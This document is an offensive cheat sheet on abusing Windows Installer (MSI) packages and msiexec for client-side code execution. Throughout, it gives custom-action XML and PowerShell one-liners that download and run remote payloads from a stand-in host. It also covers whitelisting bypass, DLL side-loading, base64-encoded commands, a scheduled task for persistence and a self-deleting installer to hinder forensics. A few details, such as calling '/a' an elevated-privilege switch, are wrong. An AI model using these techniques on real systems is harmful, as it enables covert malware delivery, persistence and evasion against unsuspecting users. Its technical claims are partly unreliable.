

### **Client-Side Code Execution with Windows Installer (MSI)**

#### ** Basic MSI Execution**
- **Running an MSI file using `msiexec`**:
  
  ```sh
  msiexec /i path\to\installer.msi
  ```

- **Running an MSI with elevated privileges**:
  
  ```sh
  msiexec /a path\to\installer.msi
  ```

#### **Executing Embedded Payloads in an MSI**
- **Incorporating a Payload in Custom Actions**:

  Custom actions in MSI can be used to execute arbitrary commands or scripts.

  ```xml
  <CustomAction Id="PayloadAction"
                Directory="TARGETDIR"
                ExeCommand="powershell.exe -NoProfile -ExecutionPolicy Bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')&quot;"
                Execute="deferred"
                Return="check"/>
  
  <InstallExecuteSequence>
    <Custom Action="PayloadAction" After="InstallFinalize">NOT Installed</Custom>
  </InstallExecuteSequence>
  ```

  This XML fragment can be included in the MSI's `InstallExecuteSequence` to run a PowerShell payload during installation.

#### ** MSI for Payload Delivery**
- **Using `msiexec` to Download and Execute a Payload**:
  
  The following command downloads and executes a payload directly from a remote server:

  ```sh
  msiexec /q /i http://example.com/payload.msi
  ```

  The `/q` flag is used to run the MSI in quiet mode, without user interaction.

#### **Bypassing Execution Restrictions**
- **Leveraging `msiexec` to Bypass Application Whitelisting**:

  `msiexec` is often whitelisted in enterprise environments, making it a useful tool for executing malicious payloads:

  ```sh
  msiexec /q /i http://example.com/malicious.msi
  ```

- **Abusing `msiexec` for DLL Side-Loading**:

  You can side-load a malicious DLL using a legitimate MSI package:

  ```sh
  msiexec /y malicious.dll /q /i legitimate.msi
  ```

#### **Obfuscating MSI Execution**
- **Encoding `msiexec` Commands**:

  Use PowerShell to encode and execute MSI commands:

  ```powershell
  $command = 'msiexec /i http://example.com/payload.msi /quiet'
  $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
  powershell.exe -encodedCommand $encodedCommand
  ```

#### **Custom Action Execution**
- **Running Commands through MSI Custom Actions**:

  You can use custom actions to execute commands during different phases of MSI installation:

  ```xml
  <CustomAction Id="LaunchApp" FileKey="YourExeFile" ExeCommand="" Return="asyncNoWait"/>
  <InstallExecuteSequence>
    <Custom Action="LaunchApp" After="InstallFinalize"/>
  </InstallExecuteSequence>
  ```

- **Using VBS in Custom Actions**:

  If you need to execute a VBScript:

  ```xml
  <CustomAction Id="RunVBScript" Script="vbscript" Execute="deferred" Return="ignore">
    <![CDATA[
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -exec bypass -NoProfile -WindowStyle Hidden -Command ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"""
    ]]>
  </CustomAction>
  ```

#### **MSI and Persistence**
- **Adding a Scheduled Task via MSI**:

  You can use a custom action to create a scheduled task for persistence:

  ```xml
  <CustomAction Id="AddScheduledTask" Directory="TARGETDIR" ExeCommand="schtasks /create /tn &quot;Updater&quot; /tr &quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')&quot; /sc onstart" Return="asyncNoWait"/>
  <InstallExecuteSequence>
    <Custom Action="AddScheduledTask" After="InstallFinalize"/>
  </InstallExecuteSequence>
  ```

#### **Anti-Forensic Techniques**
- **Self-Deleting MSI**:

  Include a custom action that deletes the MSI file after execution:

  ```xml
  <CustomAction Id="SelfDelete" Script="vbscript" Execute="deferred" Return="ignore">
    <![CDATA[
    Set fso = CreateObject("Scripting.FileSystemObject")
    fso.DeleteFile WScript.ScriptFullName
    ]]>
  </CustomAction>
  ```

